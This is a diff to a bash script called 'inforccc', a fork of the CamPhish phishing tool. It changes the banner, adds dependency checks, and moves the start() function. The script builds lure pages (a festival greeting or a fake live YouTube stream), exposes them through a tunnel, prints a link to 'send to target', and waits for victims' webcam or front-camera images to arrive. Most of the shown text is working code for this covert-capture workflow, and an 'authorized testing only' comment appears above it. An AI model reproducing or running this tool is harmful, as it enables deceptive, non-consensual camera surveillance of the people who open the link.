@@ -1,25 +1,33 @@
 #!/bin/bash
 # inforccc v1.0
+# Author: cyberwithmanveer
 # Forked from CamPhish by baradatipu
-# Maintained by cyberwithmanveer
-# Credits: thelinuxchoice [github.com/thelinuxchoice/]
+# For authorized penetration testing only
 
 trap 'printf "\n";stop' 2
 
 banner() {
 clear
-printf "\e[1;92m  ___       _   _   _        ___  ___ ___ ___  \e[0m\n"
-printf "\e[1;92m |_ _|_ __ (_) | |_| |___   / _ \/ __/ __/ __| \e[0m\n"
-printf "\e[1;92m  | || '_ \| | | __| / __| | | | \__\__ \__ \\ \e[0m\n"
-printf "\e[1;92m  | || | | | | | |_| \__ \ | |_| |__ |__) |__) |\e[0m\n"
-printf "\e[1;92m |___|_| |_|_|  \__|_|___/  \___/|___|____/____/ \e[0m\n"
-printf "\e[1;92m  ________  ___    _____  \e[0m\e[1;77m______  _   __\e[0m\n"
-printf "\e[1;92m /_  __/ _ )/ _ | /  _/  \e[0m\e[1;77m/ __/\ \/ / /\e[0m\n"
-printf "\e[1;92m  / / / _  / __ |_/ /   \e[0m\e[1;77m/ _ \  \  / _ \e[0m\n"
-printf "\e[1;92m /_/ /____/_/ |_/___/   \e[0m\e[1;77m/___/  /_/ (_)\e[0m\n\n"
-printf "\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Tool Created by cyberwithmanveer\n"
-printf "\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] GitHub: https://github.com/cyberwithmanveer/inforccc\n"
-printf "\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Grab cam shots from front camera or PC webcam\n\n"
+printf "\e[1;92m  _______  _______  _______  \e[0m\e[1;77m_______          _________ _______          \e[0m\n"
+printf "\e[1;92m (  ____ \(  ___  )(       )\e[0m\e[1;77m(  ____ )|\     /|\__   __/(  ____ \|\     /|\e[0m\n"
+printf "\e[1;92m | (    \/| (   ) || () () |\e[0m\e[1;77m| (    )|| )   ( |   ) (   | (    \/| )   ( |\e[0m\n"
+printf "\e[1;92m | |      | (___) || || || |\e[0m\e[1;77m| (____)|| (___) |   | |   | (_____ | (___) |\e[0m\n"
+printf "\e[1;92m | |      |  ___  || |(_)| |\e[0m\e[1;77m|  _____)|  ___  |   | |   (_____  )|  ___  |\e[0m\n"
+printf "\e[1;92m | |      | (   ) || |   | |\e[0m\e[1;77m| (      | (   ) |   | |         ) || (   ) |\e[0m\n"
+printf "\e[1;92m | (____/\| )   ( || )   ( |\e[0m\e[1;77m| )      | )   ( |___) (___/\____) || )   ( |\e[0m\n"
+printf "\e[1;92m (_______/|/     \||/     \|\e[0m\e[1;77m|/       |/     \|\_______/\_______)|/     \|\e[0m\n"
+printf "\n"
+printf "\e[1;93m  _       _   _   ____   ____    ____    _____   ___  \e[0m\n"
+printf "\e[1;93m (_)     (_) | \ | |  _ \ / ___|  / ___|  |_   _| / _ \ \e[0m\n"
+printf "\e[1;93m  | |     | | |  \| | |_) | |     | |       | |  | | | |\e[0m\n"
+printf "\e[1;93m  | |     | | | |\  |  _ <| |___  | |___    | |  | |_| |\e[0m\n"
+printf "\e[1;93m  |_|     |_| |_| \_|_| \_\\\\____|  \____|   |_|   \___/ \e[0m\n"
+printf "\n"
+printf "\e[1;92m  +++  inforccc  -  Camera Intelligence Tool  +++\e[0m\n"
+printf "\e[1;77m  Author : cyberwithmanveer\e[0m\n"
+printf "\e[1;77m  GitHub : https://github.com/cyberwithmanveer/inforccc\e[0m\n"
+printf "\e[1;77m  Version: 1.0 (Forked from CamPhish)\e[0m\n"
+printf "\n"
 }
 
 stop() {
@@ -50,12 +58,12 @@ fi
 if [[ -e index2.html ]]; then
 rm -rf index2.html
 fi
-printf "\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Server stopped. Cleanup complete.\n\n"
+printf "\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] inforccc stopped. Processes cleaned.\n"
 exit 1
 }
 
 dependencies() {
-printf "\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Checking dependencies...\n"
+printf "\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Checking dependencies...\n"
 command -v php > /dev/null 2>&1 || { echo >&2 "PHP is required but not installed."; exit 1; }
 command -v curl > /dev/null 2>&1 || { echo >&2 "Curl is required but not installed."; exit 1; }
 command -v ssh > /dev/null 2>&1 || { echo >&2 "SSH is required but not installed."; exit 1; }
@@ -76,7 +84,7 @@ fest_name="${fest_name//[[:space:]]/}"
 elif [[ $option_tem -eq 2 ]]; then
 read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Enter YouTube video watch ID: \e[0m' yt_video_ID
 else
-printf "\e[1;93m [!] Invalid template option! try again\e[0m\n"
+printf "\e[1;93m [!] Invalid template option! Try again\e[0m\n"
 sleep 1
 select_template
 fi
@@ -88,7 +96,7 @@ sed 's+forwarding_link+'$link'+g' template.php > index.php
 if [[ $option_tem -eq 1 ]]; then
 sed 's+forwarding_link+'$link'+g' festivalwishes.html > index3.html
 sed 's+fes_name+'$fest_name'+g' index3.html > index2.html
-else
+elif [[ $option_tem -eq 2 ]]; then
 sed 's+forwarding_link+'$link'+g' LiveYTTV.html > index3.html
 sed 's+live_yt_tv+'$yt_video_ID'+g' index3.html > index2.html
 fi
@@ -96,8 +104,8 @@ rm -rf index3.html
 }
 
 checkfound() {
-printf "\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Waiting for target to open the link...\n"
-printf "\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Press Ctrl+C to stop\n"
+printf "\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Waiting for target...\n"
+printf "\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Press Ctrl+C to exit\n"
 printf "\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Send this link to target:\e[0m\e[1;77m %s\e[0m\n" $link
 
 while [ true ]; do
@@ -117,11 +125,14 @@ done < Log.log
 rm -rf Log.log
 fi
 
-# Check for new camera images
-cam_files=(cam*.png 2>/dev/null)
-if [ ${#cam_files[@]} -gt 0 ]; then
-printf "\n\e[1;92m[\e[0m\e[1;91m!\e[0m\e[1;92m] Camera shot captured: ${cam_files[-1]}\n"
-fi
+# Check for captured images
+for cam_file in cam*.png; do
+  if [ -f "$cam_file" ]; then
+    printf "\n\e[1;92m[\e[0m\e[1;91m!\e[0m\e[1;92m] Camera image captured: $cam_file\n"
+    mv "$cam_file" "$cam_file.captured" 2>/dev/null
+  fi
+  break
+done
 
 sleep 0.5
 done
@@ -147,17 +158,38 @@ sed 's+forwarding_link+'$send_link'+g' template.php > index.php
 if [[ $option_tem -eq 1 ]]; then
 sed 's+forwarding_link+'$send_link'+g' festivalwishes.html > index3.html
 sed 's+fes_name+'$fest_name'+g' index3.html > index2.html
-else
+elif [[ $option_tem -eq 2 ]]; then
 sed 's+forwarding_link+'$send_link'+g' LiveYTTV.html > index3.html
 sed 's+live_yt_tv+'$yt_video_ID'+g' index3.html > index2.html
 fi
 rm -rf index3.html
 }
 
+start() {
+default_choose_sub="Y"
+default_subdomain="inforccc$RANDOM"
+
+printf '\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m] Choose subdomain? (Default:\e[0m\e[1;77m [Y/n] \e[0m\e[1;33m): \e[0m'
+read choose_sub
+choose_sub="${choose_sub:-${default_choose_sub}}"
+if [[ $choose_sub == "Y" || $choose_sub == "y" || $choose_sub == "Yes" || $choose_sub == "yes" ]]; then
+subdomain_resp=true
+printf '\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m] Subdomain: (Default:\e[0m\e[1;77m %s \e[0m\e[1;33m): \e[0m' $default_subdomain
+read subdomain
+subdomain="${subdomain:-${default_subdomain}}"
+fi
+
+server
+payload
+checkfound
+}
+
 ngrok_server() {
 if [[ -e ngrok ]]; then
 echo ""
 else
+command -v unzip > /dev/null 2>&1 || { echo >&2 "Unzip is required."; exit 1; }
+command -v wget > /dev/null 2>&1 || { echo >&2 "Wget is required."; exit 1; }
 printf "\e[1;92m[\e[0m+\e[1;92m] Downloading Ngrok...\n"
 arch=$(uname -a | grep -o 'arm' | head -n1)
 arch2=$(uname -a | grep -o 'Android' | head -n1)
@@ -222,25 +254,6 @@ sleep 1
 clear
 inforccc_main
 fi
-}
-
-start() {
-default_choose_sub="Y"
-default_subdomain="inforccc$RANDOM"
-
-printf '\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m] Choose subdomain? (Default:\e[0m\e[1;77m [Y/n] \e[0m\e[1;33m): \e[0m'
-read choose_sub
-choose_sub="${choose_sub:-${default_choose_sub}}"
-if [[ $choose_sub == "Y" || $choose_sub == "y" || $choose_sub == "Yes" || $choose_sub == "yes" ]]; then
-subdomain_resp=true
-printf '\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m] Subdomain: (Default:\e[0m\e[1;77m %s \e[0m\e[1;33m): \e[0m' $default_subdomain
-read subdomain
-subdomain="${subdomain:-${default_subdomain}}"
-fi
-
-server
-payload
-checkfound
 }
 
 banner
